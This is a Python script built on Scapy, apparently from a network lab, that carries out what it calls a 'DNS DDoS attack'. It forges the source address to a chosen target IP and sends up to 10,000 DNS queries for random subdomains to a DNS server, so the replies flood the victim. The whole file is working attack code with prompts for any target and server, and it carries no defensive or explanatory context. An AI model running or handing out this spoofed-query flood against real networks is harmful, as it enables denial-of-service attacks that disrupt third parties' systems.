from scapy.all import *
import random
import string
import ipaddress

# default
DEFAULT_TARGET_IP = "10.1.0.2"  # ws2
DEFAULT_DNS_IP = "10.12.0.20" # dns
DEFAULT_DNS_PORT = "5353" #dnsmasq
DEFAULT_NUM_REQUESTS = "100"

def random_domain(length):
    letters = string.ascii_letters + string.digits
    random.seed()
    domain = ''.join(random.choice(letters) for _ in range(length))
    return f"{domain}.example.com"

def dns_ddos_attack(target_ip, dns_ip, dns_port, num_requests):
    print(f"\n[*] Starting DNS DDoS attack targeting {target_ip} via DNS server {dns_ip}:{dns_port}...\n")
    num_to_send = int(num_requests)
    dest_port = int(dns_port)

    for i in range(num_to_send):
        domain = random_domain(random.randint(15, 20))
        dns_request = IP(dst=dns_ip, src=target_ip) / UDP(dport=dest_port) / DNS(rd=1, qd=DNSQR(qname=domain, qtype=1))
        send(dns_request, verbose=0)

    print(f"\n[*] Finished sending {num_to_send} DNS requests.\n")

def main():
    try:
        target_ip_input = input(f"Enter the target IP address [{DEFAULT_TARGET_IP}]: ").strip()
        target_ip = target_ip_input or DEFAULT_TARGET_IP

        dns_ip_input = input(f"Enter the DNS server IP address [{DEFAULT_DNS_IP}]: ").strip()
        dns_ip = dns_ip_input or DEFAULT_DNS_IP

        dns_port_input = input(f"Enter the DNS server port [{DEFAULT_DNS_PORT}]: ").strip()
        dns_port = dns_port_input or DEFAULT_DNS_PORT

        num_requests_input = input(f"Enter the number of requests to send [{DEFAULT_NUM_REQUESTS}]: ").strip()
        num_requests = num_requests_input or DEFAULT_NUM_REQUESTS

        ipaddress.ip_address(target_ip)
        ipaddress.ip_address(dns_ip)
        num_requests_int = int(num_requests)
        dns_port_int = int(dns_port)

        if not (0 < num_requests_int <= 10000):
            raise ValueError("Number of requests must be between 1 and 10,000.")

        if not (0 < dns_port_int <= 65535):
            raise ValueError("DNS port must be between 1 and 65535.")

    except ValueError as e:
        print(f"\n[Error] Invalid input: {e}")
        return
    except KeyboardInterrupt:
        print("\n[*] Attack interrupted by user.")
        return

    dns_ddos_attack(target_ip, dns_ip, dns_port, num_requests)

if __name__ == "__main__":
    main()